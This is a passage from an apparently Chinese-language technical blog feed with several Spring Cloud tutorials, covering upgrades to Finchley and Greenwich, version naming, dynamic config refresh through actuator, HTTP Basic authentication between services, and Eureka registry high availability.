href="http://xx.xx.xx.xx:7100/decrypt">http://xx.xx.xx.xx:7100/decrypt</a> -d secret -u user:password</p></blockquote><p>恢复 basic auth 之后，之前的服务需要加密连接配置中心的又正常运行了。</p><h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><p>升级到 Spring Boot 2.x 之后发现 Spring Boot 的 Maven 启动插件不好用了，主要是 Profile 不能自由切换。</p><p>升级前：</p><pre class="line-numbers language-none"><code class="language-none">spring-boot:run -Drun.profiles&#x3D;profile1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>升级后：</p><pre class="line-numbers language-none"><code class="language-none">spring-boot:run -Dspring-boot.run.profiles&#x3D;profile1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>具体的请参考：<br><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/run-mojo.html">https://docs.spring.io/spring-boot/docs/current/maven-plugin/run-mojo.html</a></p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上都是踩完所有的坑总结出来的解决方案，实际解决问题的过程远要复杂的多。版本变化有点大，本次已成功升级了 Spring Cloud 基础依赖，及注册中心（Eureka Server）、配置中心（Config Server）。</p><p>其他像 Gateway 代替了 Zuul, 及其他组件再慢慢升级，Spring Cloud 的快速发展令升级变得非常蛋疼，本文记录了升级过程中踩过的所有的坑。。。</p><p>坑死了，已经保证编译、运行正常，其他还有什么坑不知道，刚升级完 Finchley 这个正式版本，Spring Cloud 刚刚又发布了 Finchley.SR1，感觉 Spring Cloud 变成了学不动系列了。。。</p><p><strong>@ All 码农们：你们升级了吗？有遇到什么样的坑？欢迎留言！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 升级最新 Greenwich 版本，舒服了~</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%8D%87%E7%BA%A7%E6%9C%80%E6%96%B0%20Greenwich%20%E7%89%88%E6%9C%AC%EF%BC%8C%E8%88%92%E6%9C%8D%E4%BA%86~/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%8D%87%E7%BA%A7%E6%9C%80%E6%96%B0%20Greenwich%20%E7%89%88%E6%9C%AC%EF%BC%8C%E8%88%92%E6%9C%8D%E4%BA%86~/</url>
      
        <content type="html"><![CDATA[<p>去年将 Spring Cloud 升级到了 Finchley 版本：<br><a href="https://mp.weixin.qq.com/s/CvAmV4mjWHqNPkUoy0CwYw">Spring Cloud 升级最新 Finchley 版本，踩了所有的坑！</a></p><p>这个大版本栈长是踩了非常多的坑啊，帮助了不少小伙伴。</p><p>Spring Cloud Greenwich 在 01&#x2F;23&#x2F;2019 这天正式发布了：<br><a href="https://mp.weixin.qq.com/s/V6W634Rqjm9SoKb04bGygA">Spring Cloud Greenwich 正式发布，Hystrix 即将寿终正寝！</a>。</p><p>Greenwich发布也快 1 年了，栈长迟迟没有升级，距离上个大版本升级一年多了，所以栈长最近将 Spring Cloud 升级到了 Greenwich，几乎没踩多少坑，但也有坑，这里再记录分享一下，希望对你有用。</p><h2 id="依赖升级"><a href="#依赖升级" class="headerlink" title="依赖升级"></a>依赖升级</h2><p><strong>升级前 &#x3D;&gt; 升级后</strong></p><p>Spring Cloud Finchley.RELEASE &#x3D;&gt; Spring Cloud Greenwich.SR3</p><p>Spring Boot 2.0.2.RELEASE &#x3D;&gt; Spring Boot 2.1.7.RELEASE</p><p><strong>为什么不直接升级到 Spring Boot 2.2.x？</strong></p><p>Spring Cloud 和 Spring Boot 兼容性请见正文表格：</p><table><thead><tr><th>Spring Cloud Train</th><th>Spring Boot Version</th></tr></thead><tbody><tr><td>Hoxton</td><td>2.2.x</td></tr><tr><td>Greenwich</td><td>2.1.x</td></tr><tr><td>Finchley</td><td>2.0.x</td></tr><tr><td>Edgware</td><td>1.5.x</td></tr><tr><td>Dalston</td><td>1.5.x</td></tr></tbody></table><p>如果用超出版本的，兼容性会有问题。</p><p>分不清这些版本的区别和意义？可以参考栈长之前写的关于版本的文章：<br><a href="https://mp.weixin.qq.com/s/IqlHFsIrFJ5vBG9-1gldJw">Spring Cloud 多版本怎么选择？</a>。</p><h2 id="Feign踩坑"><a href="#Feign踩坑" class="headerlink" title="Feign踩坑"></a>Feign踩坑</h2><p>升级后，应用启动正常，但调用 Feign 服务的时候报了个这个异常：</p><blockquote><p>The bean ‘SERVICE-XXX.FeignClientSpecification’, defined in null, could not be registered. A bean with that name has already been defined in null and overriding is disabled.</p></blockquote><p>同时日志中也给出了解决文案：</p><blockquote><p>Action:</p><p>Consider renaming one of the beans or enabling overriding by setting spring.main.allow-bean-definition-overriding&#x3D;true</p></blockquote><p>没错，就是在配置文件中配置上这个参数：</p><blockquote><p>spring.main.allow-bean-definition-overriding&#x3D;true</p></blockquote><p>原因就是使用 <code>@FeignClient</code> 的时候定义了多个相同 <code>name</code> 的接口。</p><pre class="line-numbers language-none"><code class="language-none">@FeignClient(name &#x3D; &quot;xxx&quot;, configuration &#x3D; XXXConfig.class, fallbackFactory &#x3D;        XXXServiceFallback.class)public interface XXXService extends IXXXService &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>那为什么升级之后是好好的呢？</strong></p><p>那是因为在 Spring Boot 2.1.0 之后把默认值改成了false。</p><p><img src="http://img.javastack.cn/20191107153501.png"></p><p><img src="http://img.javastack.cn/20191107164525.png"></p><p>而在 Spring Boot 2.1.0 之前这个值都是 true，也没有这个参数可以修改这个配置。</p><p><img src="http://img.javastack.cn/20191107152500.png"></p><p><strong>那这个参数到底有什么用？</strong></p><p>正常情况下，Spring容器里面只可能有一个唯一名字的 Bean 的，如果名字相同的情况下，就要看这个参数决定了，即是否允许 Bean 覆盖，不允许情况下会抛出异常，如果允许，则谁覆盖谁要看 Spring 容器 Bean 的初始化的顺序了。</p><p>所以，配置这个参数为 true 后，多个 <code>@FeignClient</code> 注解相同名字的 Bean 的 <code>configuration</code> 参数就会被覆盖了。</p><p>如果项目中有多个 <code>configuration</code>，那会受影响，我们没有多个这样的配置，所以暂且先配置这个参数解决问题。解决之后，就能正常使用 Feign 了，正常访问微服务。</p><p>这难道是 Feign 的坑吗？不可能把所有东西都写在一个接口服务里面啊！暂时也没找到好的办法，后续再研究下吧。</p><p>@ All 码农们：你们升级了吗？有遇到什么样的坑？欢迎留言！</p><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 多版本管理那些事。</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%A4%9A%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E9%82%A3%E4%BA%9B%E4%BA%8B%E3%80%82/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%A4%9A%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E9%82%A3%E4%BA%9B%E4%BA%8B%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>好久没有研究 Spring Cloud 了，也没有关注它的更新及新特性，上官网看了下，又增加了几个版本，有正式版有预览版，多达 6 个版本，实在让人蒙逼。</p><p>而我们的项目版本还仪停留在 Dalston SR1 版本。</p><h4 id="Spring-Cloud-的多版本"><a href="#Spring-Cloud-的多版本" class="headerlink" title="Spring Cloud 的多版本"></a>Spring Cloud 的多版本</h4><p><img src="http://img.javastack.cn/18-4-2/44559010.jpg"></p><p>这么多不同的版本，它们都有什么区别，我们开发微服务到底使用哪一个版本呢？这些版本与 Spring Boot 版本又是一个怎样的依赖关系？带着这些问题，我们必须把它一一搞清楚，不然总会让你很头疼。。</p><p>首先 Spring Cloud 是一个由很多子项目组成的庞大项目，Spring Cloud 的主要项目如下：</p><pre class="line-numbers language-none"><code class="language-none">Spring Cloud ConfigSpring Cloud NetflixSpring Cloud BusSpring Cloud ClusterSpring Cloud Security...更多请参考官方说明：https:&#x2F;&#x2F;projects.spring.io&#x2F;spring-cloud&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而，这些子项目都有不同的发布阶段，为了管理主项目和子项目的依赖关系，以及为了避免和子项目版本的冲突和误解，主项目版本命名并没有采用和子项目数字版本化的形式，而是采用了英文名称。</p><p>英文命名方式也比较有意思，Spring Cloud 采用了英国伦敦地铁站的名称来命名，并由地铁站名称字母A-Z依次类推的形式来发布迭代版本。</p><p>由上可知，Spring Cloud 的第一个版本 “Angel” 就不觉得奇怪了，接着 “Brixton” 就是第二个版本。当一个项目到达发布临界点或者解决了一个严重的BUG后就会发布一个 “service Release” 版本， 简称 SR（X）版本，x 代表一个递增数字。</p><p><strong>由此我们可以得出 “Finchley M9” 就是目前最新的开发版本，”Edgware SR3” 是最新稳定版本。</strong></p><h4 id="Spring-Cloud-版本依赖关系"><a href="#Spring-Cloud-版本依赖关系" class="headerlink" title="Spring Cloud 版本依赖关系"></a>Spring Cloud 版本依赖关系</h4><p>下图揭示了主项目和子项目版本的依赖关系。</p><p><img src="http://img.javastack.cn/18-4-2/50615593.jpg"></p><h4 id="Spring-Cloud-Spring-Boot-依赖关系"><a href="#Spring-Cloud-Spring-Boot-依赖关系" class="headerlink" title="Spring Cloud &amp; Spring Boot 依赖关系"></a>Spring Cloud &amp; Spring Boot 依赖关系</h4><p><img src="http://img.javastack.cn/18-4-2/47489606.jpg"></p><ul><li>Finchley 是基于 Spring Boot 2.0.x 构建的，不支持 Spring Boot 1.5.x</li><li>Dalston 和 Edgware 是基于 Spring Boot 1.5.x 构建的，不支持 Spring Boot 2.0.x</li><li>Camden 构建于 Spring Boot 1.4.x，但依然能支持 Spring Boot 1.5.x</li></ul><p>注意：Brixton 和 Angel 版本在2017年7月已经停止更新迭代了，我们就不关注它的版本依赖关系了。</p><p>Spring Cloud 正处理高速发展期，版本发布更新太快，项目更新版本还要考虑兼容性等各种问题，让人很头疼！后续我会慢慢揭开这些面纱。。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 如何动态刷新 Git 仓库配置？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%A6%82%E4%BD%95%E5%8A%A8%E6%80%81%E5%88%B7%E6%96%B0%20Git%20%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E5%A6%82%E4%BD%95%E5%8A%A8%E6%80%81%E5%88%B7%E6%96%B0%20Git%20%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>有时候在配置中心有些参数是需要修改的，这时候如何不重启而达到实时生效的效果呢？</p><p><strong>本文基于以下讲解：</strong></p><ul><li>Spring Cloud Greenwich.SR3</li><li>Spring Boot 2.1.7.RELEASE</li><li>基于 Git 的配置中心仓库</li></ul><h4 id="添加-actuator-依赖"><a href="#添加-actuator-依赖" class="headerlink" title="添加 actuator 依赖"></a>添加 actuator 依赖</h4><p>在引用配置中心的项目中添加以下 <code>actuator</code> 依赖：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;    ...&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;...&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>spring-boot-starter-actuator</code>：这个模块的 <code>/actuator/refresh</code> (POST请求)端点可以刷新配置，更多的使用参考 Spring Boot 系列文章。</p><h4 id="暴露-refresh-端点"><a href="#暴露-refresh-端点" class="headerlink" title="暴露 refresh 端点"></a>暴露 refresh 端点</h4><p>actuator 默认是不暴露 refresh 端点的，需要我们主动暴露，在引用配置中心的项目中添加以下配置：</p><pre class="line-numbers language-none"><code class="language-none">management:  endpoints:    web:      exposure:        include: refresh,info,health<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="添加刷新范围"><a href="#添加刷新范围" class="headerlink" title="添加刷新范围"></a>添加刷新范围</h4><p>引用了配置中心的项目，在需要刷新的 <code>Bean</code> 上添加 <code>@RefreshScope</code> 注解。</p><p><strong>示例1：</strong></p><pre class="line-numbers language-none"><code class="language-none">@RefreshScope@RestControllerpublic class TestController &#123;@Value(&quot;$&#123;username&#125;&quot;)private String username;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>示例2：</strong></p><pre class="line-numbers language-none"><code class="language-none">@RefreshScope@ConfigurationProperties(prefix &#x3D; &quot;spring.mail&quot;)public class MailProperties &#123;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当配置更改时，标有 <code>@RefreshScope</code> 的 <code>Bean</code> 将得到特殊处理来生效配置，不然改了配置不会刷新的。<code>@RefreshScope</code> 的原理可以参考这篇文章：<a href="https://mp.weixin.qq.com/s/DcnNLTkPA8j4zpk4Dkq4fQ">Spring Cloud @RefreshScope 原理是什么？</a>，很详细。</p><h4 id="手动刷新配置"><a href="#手动刷新配置" class="headerlink" title="手动刷新配置"></a>手动刷新配置</h4><p>修改配置后，我们可以通过 post 到 <code>/actuator/refresh</code> 即可手动刷新配置。</p><p>如下图所示：</p><p><img src="http://img.javastack.cn/20191209171607.png"></p><p>如果参数有变更，刷新成功的话，会返回一个含有参数名的变更数组。</p><h4 id="自动刷新配置"><a href="#自动刷新配置" class="headerlink" title="自动刷新配置"></a>自动刷新配置</h4><p>如果你使用了 Gitlab 或者 Github 仓库，可以配置 <code>Webhooks</code> 来做到自动更新，当参数变更时，能做到自动通知。</p><p>Gitlab配置如下图所示：</p><p><img src="http://img.javastack.cn/20191209165252.png"></p><p>Github也差不多的，可以配置一个 URL（用于变更通知）和一个 Secret Token（用于请求验证）。</p><p>但这种方式仅限于单台，如果有多台或者多个系统，该如何通知，恐怕需要加一个公共接口来绕一圈了。</p><p>如果需要请求头认证的，可以使用这种方式：</p><blockquote><p><a href="https://user:password@ip:port/xxxx">https://user:password@ip:port/xxxx</a></p></blockquote><h4 id="扩展问题"><a href="#扩展问题" class="headerlink" title="扩展问题"></a>扩展问题</h4><p>如果使用配置中心项目少的情况，我们是可以通过上面的方式进行配置动态刷新，如果项目比较复杂的情况呢？</p><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 是什么？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。</p><p>Spring并没有重复制造轮子，它只是将目前各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p><p>目前最新版本：Dalston.SR3</p><blockquote><p>官网：<a href="http://projects.spring.io/spring-cloud/">http://projects.spring.io/spring-cloud/</a></p></blockquote><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>Spring Cloud专注于提供良好的开箱即用经验的典型用例和可扩展性机制覆盖。</p><ul><li><p>分布式&#x2F;版本化配置</p></li><li><p>服务注册和发现</p></li><li><p>路由</p></li><li><p>service - to - service调用</p></li><li><p>负载均衡</p></li><li><p>断路器</p></li><li><p>分布式消息传递</p></li></ul><h2 id="子项目"><a href="#子项目" class="headerlink" title="子项目"></a>子项目</h2><p>Spring Cloud的子项目，大致可分成两类，一类是对现有成熟框架”Spring Boot化”的封装和抽象，也是数量最多的项目；第二类是开发了一部分分布式系统的基础设施的实现，如Spring Cloud Stream扮演的就是kafka, ActiveMQ这样的角色。对于我们想快速实践微服务的开发者来说，第一类子项目就已经足够使用，如：</p><ul><li><p>Spring Cloud Netflix</p><p>  是对Netflix开发的一套分布式服务框架的封装，包括服务的发现和注册，负载均衡、断路器、REST客户端、请求路由等。</p></li><li><p>Spring Cloud Config</p><p>  将配置信息外部化存储, 并能配合Spring Cloud Bus可以实现动态修改配置文件。</p></li><li><p>Spring Cloud Bus</p><p>  分布式消息队列，是对Kafka, MQ的封装。</p></li><li><p>Spring Cloud Security</p><p>  是对Spring Security的封装，能实现服务之间的认证调用和安全保护等，并能配合Netflix使用。</p></li><li><p>Spring Cloud Zookeeper</p><p>  对Zookeeper的封装，使之能配置其它Spring Cloud的子项目使用。</p></li><li><p>Spring Cloud Eureka</p><p>  是 Spring Cloud Netflix微服务套件中的一部分，它基于Netflix Eureka 做了二次分装，主要负责完成微服务架构中的服务治理功能。</p></li></ul><h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>Spring Cloud对于中小型互联网公司来说是一种福音，因为这类公司往往没有实力或者没有足够的资金投入去开发自己的分布式系统基础设施，使用Spring Cloud一站式解决方案能在从容应对业务发展的同时大大减少开发成本。同时，随着近几年微服务架构和Docker容器概念的火爆，也会让Spring Cloud在未来越来越“云”化的软件开发风格中立有一席之地，尤其是在目前五花八门的分布式解决方案中提供了标准化的、全站式的技术方案，意义可能会堪比当前Servlet规范的诞生，有效推进服务端软件系统技术水平的进步。</p><h2 id="和dubbo的对比"><a href="#和dubbo的对比" class="headerlink" title="和dubbo的对比"></a>和dubbo的对比</h2><table><thead><tr><th>组件</th><th>Dubbo</th><th>Spring Cloud</th></tr></thead><tbody><tr><td>服务注册中心</td><td>Zookeeper</td><td>Spring Cloud Netflix Eureka</td></tr><tr><td>服务调用方式</td><td>RPC</td><td>REST API</td></tr><tr><td>服务网关</td><td>无</td><td>Spring Cloud Netflix Zuul</td></tr><tr><td>断路器</td><td>不完善</td><td>Spring Cloud Netflix Hystrix</td></tr><tr><td>分布式配置</td><td>无</td><td>Spring Cloud Config</td></tr><tr><td>服务跟踪</td><td>无</td><td>Spring Cloud Sleuth</td></tr><tr><td>消息总线</td><td>无</td><td>Spring Cloud Bus</td></tr><tr><td>数据流</td><td>无</td><td>Spring Cloud Stream</td></tr><tr><td>批量任务</td><td>无</td><td>Spring Cloud Task</td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table><p>所以，对比看出其实没什么比较性，Dubbo只是Spring Cloud的一个子集而已，Spring Cloud是一系列的分布式的解决方案包。不过随着目前Dubbo官方的重新申明维护并得到重视，Dubbo生态圈也会逐渐强大。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 服务安全连接</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E8%BF%9E%E6%8E%A5/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud可以增加HTTP Basic认证来增加服务连接的安全性。</p><h2 id="1、加入security启动器"><a href="#1、加入security启动器" class="headerlink" title="1、加入security启动器"></a>1、加入security启动器</h2><p>在maven配置文件中加入Spring Boot的security启动器。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-security&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样，就开启对服务连接的安全保护，系统默认为生成一个用户名为”user”及一个随机密码，随机密码在服务启动的时候在日志中会打印出来。</p><h2 id="2、自定义用户名密码"><a href="#2、自定义用户名密码" class="headerlink" title="2、自定义用户名密码"></a>2、自定义用户名密码</h2><p>随机密码没什么实际意义，我们需要一个固定的连接用户名和密码。</p><p>在应用配置文件中加入以下配置即可。</p><pre class="line-numbers language-none"><code class="language-none">security:   user:     name: admin    password: admin123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样配置完后在连接这个服务的时候就会要求输入用户名和密码，如果认证失败会返回401错误。</p><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;timestamp&quot;: 1502689874556,    &quot;status&quot;: 401,    &quot;error&quot;: &quot;Unauthorized&quot;,    &quot;message&quot;: &quot;Bad credentials&quot;,    &quot;path&quot;: &quot;&#x2F;test&#x2F;save&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、安全连接"><a href="#3、安全连接" class="headerlink" title="3、安全连接"></a>3、安全连接</h2><p>1、注册中心安全连接</p><p>username:password@ipaddress</p><p>2、Feign申明式服务安全连接</p><pre class="line-numbers language-none"><code class="language-none">@FeignClient(name &#x3D; &quot;SERVICE&quot;, configuration &#x3D; FeignAuthConfig.class)public interface OrderService extends OrderAPI &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">@Configurationpublic class FeignAuthConfig &#123;    @Bean    public BasicAuthRequestInterceptor basicAuthRequestInterceptor() &#123;    return new BasicAuthRequestInterceptor(&quot;admin&quot;,&quot;admin123456&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 注册中心高可用搭建</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E9%AB%98%E5%8F%AF%E7%94%A8%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E9%AB%98%E5%8F%AF%E7%94%A8%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud的注册中心可以由Eureka、Consul、Zookeeper、ETCD等来实现，这里推荐使用Spring Cloud Eureka来实现注册中心，它基于Netfilix的Eureka做了二次封装，完成分布式服务中服务治理的功能，微服务系统中的服务注册与发现都通过这个注册中心来进行管理。</p><h2 id="引入Eureka-Server依赖"><a href="#引入Eureka-Server依赖" class="headerlink" title="引入Eureka Server依赖"></a>引入Eureka Server依赖</h2><p>之前的文章基础上加入Spring Cloud的依赖，现在再加入注册中心Eureka Server的依赖。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-eureka-server&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加启动类，开启Eureka-Server功能"><a href="#添加启动类，开启Eureka-Server功能" class="headerlink" title="添加启动类，开启Eureka Server功能"></a>添加启动类，开启Eureka Server功能</h2><p>在包根目录下加入启动类：</p><pre class="line-numbers language-none"><code class="language-none">@EnableEurekaServer@SpringBootApplicationpublic class RegisterApplication &#123;public static void main(String[] args) &#123;new SpringApplicationBuilder(RegisterApplication.class).bannerMode(Banner.Mode.LOG).run(args);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@EnableEurekaServer</code>注解即开启注册中心服务器的功能。</p><h2 id="添加Eureka配置"><a href="#添加Eureka配置" class="headerlink" title="添加Eureka配置"></a>添加Eureka配置</h2><p>在application.yml中加入如下配置：</p><pre class="line-numbers language-none"><code class="language-none">spring:   application:     name: register-center  profiles:     active: register-center1    eureka:  instance:     prefer-ip-address: true    instance-id: $&#123;spring.cloud.client.ipAddress&#125;:$&#123;server.port&#125;    lease-expiration-duration-in-seconds: $&#123;lease-expiration-duration-in-seconds&#125;    lease-renewal-interval-in-seconds: $&#123;lease-renewal-interval-in-seconds&#125;  server:     enable-self-preservation: $&#123;enable-self-preservation&#125;      eviction-interval-timer-in-ms: $&#123;eviction-interval-timer-in-ms&#125;  client:    register-with-eureka: true    fetch-registry: true    serviceUrl:       defaultZone: $&#123;register-center.urls&#125;      ---  spring:   profiles: register-center1      server:   port: $&#123;register-center1.server.port&#125;      ---spring:   profiles: register-center2  server:   port: $&#123;register-center2.server.port&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里做了两台注册中心的高可用配置register-center1,register-center2，也可以做多台，既然是高可用，每个注册中心都向别的注册中心注册自己。</p><h2 id="Maven-filter配置"><a href="#Maven-filter配置" class="headerlink" title="Maven filter配置"></a>Maven filter配置</h2><p>${}里面的配置由maven resource filter来打包进行控制，不同的环境使用不同的配置文件。</p><p>如filter-dev.properties的配置参考如下：</p><pre class="line-numbers language-none"><code class="language-none">#urlregister-center1.server.ip&#x3D;192.168.1.22register-center2.server.ip&#x3D;192.168.1.23register-center.urls&#x3D;http:&#x2F;&#x2F;$&#123;register-center1.server.ip&#125;:$&#123;register-center1.server.port&#125;&#x2F;eureka&#x2F;,http:&#x2F;&#x2F;$&#123;register-center2.server.ip&#125;:$&#123;register-center2.server.port&#125;&#x2F;eureka&#x2F;#portregister-center1.server.port&#x3D;7001register-center2.server.port&#x3D;7002      #configenable-self-preservation&#x3D;falseeviction-interval-timer-in-ms&#x3D;5000lease-expiration-duration-in-seconds&#x3D;20lease-renewal-interval-in-seconds&#x3D;6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Spring-Cloud配置详解"><a href="#Spring-Cloud配置详解" class="headerlink" title="Spring Cloud配置详解"></a>Spring Cloud配置详解</h2><p>Spring Boot的配置参考Spring Boot系列文章，这里只对Spring 